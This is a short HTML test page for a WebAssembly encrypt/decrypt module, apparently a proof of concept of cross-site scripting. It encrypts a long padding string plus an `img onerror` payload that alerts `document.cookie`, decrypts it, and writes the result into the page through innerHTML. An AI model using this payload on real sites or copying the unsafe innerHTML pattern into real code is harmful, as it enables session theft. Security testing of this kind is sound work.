<!doctype html>
<html lang="en-US">
  <head>
    <meta charset="utf-8" />
    <title>hello-wasm example</title>
  </head>
  <body>
		<div id="decryption_message"></div>
    <script type="module">
      import init, { encrypt, decrypt} from "../pkg/wasm.js";
      init().then(() => {
				let encrypted = encrypt("A".repeat(300) + "<img src=\"\" onerror=\"alert(document.cookie);\" />");
        console.log("encrypted: " + encrypted);
				let status = decrypt(encrypted);
				status.replace("ï¿½", "");
        console.log("status: " + status);
				const status_element = document.createElement("h1");
				status_element.innerHTML = status;
				document.getElementById("decryption_message").appendChild(status_element);
      });
    </script>
  </body>
</html>

